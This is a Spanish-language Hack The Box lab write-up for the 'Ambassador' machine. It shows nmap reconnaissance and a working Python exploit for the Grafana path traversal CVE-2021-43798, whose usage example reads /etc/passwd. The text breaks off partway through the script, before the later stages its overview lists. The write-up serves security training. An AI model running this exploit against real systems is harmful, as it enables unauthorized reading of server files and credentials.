<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Ambassador" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBAmbassador/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBAmbassador/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-23T15:45:18-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Ambassador" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-11-23T15:45:18-05:00","datePublished":"2022-11-23T15:45:18-05:00","description":"Overview","headline":"Hackthebox Writeup Ambassador","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBAmbassador/"},"url":"https://e1p0tr0.github.io/posts/HTBAmbassador/"}</script><title>Hackthebox Writeup Ambassador | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Ambassador</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Ambassador</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guillén</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1669236318" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-11-23 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4686 words"> <em>26 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><ol><li><strong>Directory Path Traversal</strong> by grafana plugin url (CVE-2021-43798)<li>SQLite and MySQL <strong>Database enumeration</strong> (Foothold)<li><strong>Remote Code Execution</strong> by Consul Service Registration (Privilege Escalation)</ol><p><img data-src="/assets/img/htb/writeups/ambassador/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.183<td style="text-align: center">01 Oct 2022<td style="text-align: center">Medium<td style="text-align: center">30</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexión con la máquina:</p><div class="language-shell nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.183
PING 10.10.11.183 <span class="o">(</span>10.10.11.183<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.183: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>106 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.183 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 105.547/105.547/105.547/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicación de parámetros:</p><p>-c &lt;count&gt; : Número de paquetes ICMP que deseamos enviar a la máquina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con la fase de reconocimiento haciendo un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir los puertos abiertos de la máquina:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.183
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-23 15:48 -05
Nmap scan report for 10.10.11.183
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
                \_________________ Secure Shell Protocol
80/tcp   open  http
                \_________________ Hypertext Transfer Protocol
3000/tcp open  ppp
                \_________________ Point-to-Point Protocol
3306/tcp open  mysql
                \_________________ MySQL database
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>–open : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexión), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como mínimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuestión (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora escaneamos más a fondo para enumerar que servicios corren por detrás de los puertos <strong>21(FTP)</strong> - <strong>22(SSH)</strong> - <strong>80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
</pre><td class="rouge-code"><pre><span class="go">❯ nmap -p22,80,3000,3306 -sCV -oN open_ports_TCP 10.10.11.183
Nmap scan report for ambassador.htb (10.10.11.183)
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
</span><span class="gp">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
</span><span class="gp">|     Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Expires: -1
|     Location: /login
|     Pragma: no-cache
</span><span class="gp">|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
<span class="go">|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
</span><span class="gp">|     X-Xss-Protection: 1;</span><span class="w"> </span><span class="nv">mode</span><span class="o">=</span>block
<span class="go">|     Date: Wed, 23 Nov 2022 20:56:51 GMT
|     Content-Length: 29
</span><span class="gp">|     href="/login"&gt;</span>Found&lt;/a&gt;.
<span class="go">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
</span><span class="gp">|     Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
</span><span class="gp">|     Content-Type: text/html;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">|     Expires: -1
|     Location: /login
|     Pragma: no-cache
</span><span class="gp">|     Set-Cookie: redirect_to=%2F;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
<span class="go">|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
</span><span class="gp">|     X-Xss-Protection: 1;</span><span class="w"> </span><span class="nv">mode</span><span class="o">=</span>block
<span class="go">|     Date: Wed, 23 Nov 2022 20:56:18 GMT
|     Content-Length: 29
</span><span class="gp">|     href="/login"&gt;</span>Found&lt;/a&gt;.
<span class="go">|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
</span><span class="gp">|     Set-Cookie: redirect_to=%2F;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
<span class="go">|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
</span><span class="gp">|     X-Xss-Protection: 1;</span><span class="w"> </span><span class="nv">mode</span><span class="o">=</span>block
<span class="go">|     Date: Wed, 23 Nov 2022 20:56:24 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 61
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, FoundRows, IgnoreSigpipes, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: d. \x1Al\x0D\x08@c\x08\x03.F5e\x13m\x10\2
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=11/23%Time=637E88F0%P=x86_64-pc-linux-gnu%r(G
</span><span class="c">...
</span><span class="gp">SF:T\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\"/login\"&gt;</span>Found&lt;/a&gt;<span class="se">\.\n\n</span>
<span class="gp">SF:");</span><span class="w">
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicación de parámetros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusión de parámetros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detección de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Omitimos el escaneo al puerto <strong>22(SSH)</strong> y <strong>3306(MySQL)</strong> ya que no tenemos ninguna credencial válida y la versión del servicio no es vulnerable. Por otro lado, tenemos los servicios web en los puertos <strong>80(HTTP)</strong> y <strong>3000(PPP)</strong>:</p><blockquote><p>Enumeración del puerto <strong>80</strong></p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/ssh_user_leak.png" alt="SSH user leakage" data-proofer-ignore></p><p>Debido a un <strong>Leakage Information</strong> conseguimos un posible usuario para conectarnos por SSH</p><blockquote><p>Enumeración del puerto <strong>3000</strong></p></blockquote><p>Del escaneo anterior con <code class="language-plaintext highlighter-rouge">nmap</code> no conseguimos información sobre las tecnologías del servicio, por ello usamos <code class="language-plaintext highlighter-rouge">whatweb</code> para enumerarlas:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">❯ whatweb 10.10.11.183:3000
</span><span class="gp">http://10.10.11.183:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[10.10.11.183], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1;</span><span class="w"> </span><span class="nv">mode</span><span class="o">=</span>block]
<span class="gp">http://10.10.11.183:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.2.0], HTML5, IP[10.10.11.183], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1;</span><span class="w"> </span><span class="nv">mode</span><span class="o">=</span>block]
</pre></table></code></div></div><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Observamos que existe una redirección a un panel de login, pero mas importante, vemos una tecnología llamada <code class="language-plaintext highlighter-rouge">Grafana[8.2.0]</code>. Así que de manera general usamos <code class="language-plaintext highlighter-rouge">searchsploit</code> (herramienta de la linea de comandos para buscar diferentes exploits de su base de datos <em>Exploit DB</em>):</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="go">❯ searchsploit Grafana
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                               | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read           | multiple/webapps/50581.py
---------------------------------------------------------------------- ---------------------------------
</span></pre></table></code></div></div><p>Encontramos que una version posterior es vulnerable a un <strong>Path Traversal</strong>, para asegurarnos buscamos en internet vulnerabilidades con la respectiva versión:</p><blockquote><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43798">CVE-2021-43798</a></p></blockquote><p><img data-src="/assets/img/htb/writeups/ambassador/CVE-2021-43798_detail.png" alt="CVE detail" class="shadow" data-proofer-ignore></p><p>Como validamos que es vulnerable, basandonos en el script original tenemos el siguiente exploit:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
</pre><td class="rouge-code"><pre><span class="s">"""
CVE-2021-43798
--------------
Description: Vulnerable path traversal in Grafana for version v8.0.0-beta1 to v8.3.0
"""</span>

<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">choice</span>
<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">Session</span><span class="p">,</span> <span class="n">Request</span>

<span class="c1"># Ctrl + c
# (function)
</span><span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] User terminated.'</span><span class="p">)</span>

<span class="c1"># (signal)
</span><span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>


<span class="c1">## Default plugins Grafana (https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/)
</span><span class="n">plugins</span> <span class="o">=</span> <span class="p">[</span> 
	<span class="s">"alertlist"</span><span class="p">,</span>
	<span class="s">"annolist"</span><span class="p">,</span>
	<span class="s">"barchart"</span><span class="p">,</span>
	<span class="s">"bargauge"</span><span class="p">,</span>
	<span class="s">"candlestick"</span><span class="p">,</span>
	<span class="s">"cloudwatch"</span><span class="p">,</span>
	<span class="s">"dashlist"</span><span class="p">,</span>
	<span class="s">"elasticsearch"</span><span class="p">,</span>
	<span class="s">"gauge"</span><span class="p">,</span>
	<span class="s">"geomap"</span><span class="p">,</span>
	<span class="s">"gettingstarted"</span><span class="p">,</span>
	<span class="s">"grafana-azure-monitor-datasource"</span><span class="p">,</span>
	<span class="s">"graph"</span><span class="p">,</span>
	<span class="s">"heatmap"</span><span class="p">,</span>
	<span class="s">"histogram"</span><span class="p">,</span>
	<span class="s">"influxdb"</span><span class="p">,</span>
	<span class="s">"jaeger"</span><span class="p">,</span>
	<span class="s">"logs"</span><span class="p">,</span>
	<span class="s">"loki"</span><span class="p">,</span>
	<span class="s">"mssql"</span><span class="p">,</span>
	<span class="s">"mysql"</span><span class="p">,</span>
	<span class="s">"news"</span><span class="p">,</span>
	<span class="s">"nodeGraph"</span><span class="p">,</span>
	<span class="s">"opentsdb"</span><span class="p">,</span>
	<span class="s">"piechart"</span><span class="p">,</span>
	<span class="s">"pluginlist"</span><span class="p">,</span>
	<span class="s">"postgres"</span><span class="p">,</span>
	<span class="s">"prometheus"</span><span class="p">,</span>
	<span class="s">"stackdriver"</span><span class="p">,</span>
	<span class="s">"stat"</span><span class="p">,</span>
	<span class="s">"state-timeline"</span><span class="p">,</span>
	<span class="s">"status-history"</span><span class="p">,</span>
	<span class="s">"table"</span><span class="p">,</span>
	<span class="s">"table-old"</span><span class="p">,</span>
	<span class="s">"tempo"</span><span class="p">,</span>
	<span class="s">"testdata"</span><span class="p">,</span>
	<span class="s">"text"</span><span class="p">,</span>
	<span class="s">"timeseries"</span><span class="p">,</span>
	<span class="s">"welcome"</span><span class="p">,</span>
	<span class="s">"zipkin"</span>
<span class="p">]</span>

<span class="c1">## Functions
# make request to grafana
</span><span class="k">def</span> <span class="nf">make_request</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="k">with</span> <span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>

			<span class="n">vulnerable_path</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">target</span> <span class="o">+</span> <span class="s">'/public/plugins/'</span> <span class="o">+</span> <span class="n">choice</span><span class="p">(</span><span class="n">plugins</span><span class="p">)</span> <span class="o">+</span> <span class="s">'/..'</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="n">args</span><span class="p">.</span><span class="nb">file</span>
			
			<span class="n">request</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="s">'GET'</span><span class="p">,</span> <span class="n">vulnerable_path</span><span class="p">)</span>

			<span class="n">prepare_req</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">prepare_request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
			<span class="n">prepare_req</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">vulnerable_path</span>

			<span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">prepare_req</span><span class="p">)</span>

			<span class="k">if</span> <span class="s">'Plugin not found'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
				<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[!] File not found'</span><span class="p">)</span>
			<span class="k">else</span><span class="p">:</span>
				<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
					<span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">{}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">))</span>

	<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">error</span><span class="p">:</span>
		<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">[X] Error: %s'</span> <span class="o">%</span> <span class="n">error</span><span class="p">)</span>


<span class="c1">## Main flow
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
		<span class="n">description</span><span class="o">=</span><span class="s">"Vulnerable path traversal in Grafana for version v8.0.0-beta1 to v8.3.0"</span><span class="p">,</span>
		<span class="n">formatter_class</span><span class="o">=</span><span class="n">argparse</span><span class="p">.</span><span class="n">RawDescriptionHelpFormatter</span><span class="p">,</span>
		<span class="n">epilog</span><span class="o">=</span><span class="s">"""Example:
		CVE-2021-43798.py -t http://10.10.11.183:3000 -f /etc/passwd
		"""</span><span class="p">)</span>

	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--target'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Grafana host'</span><span class="p">)</span>
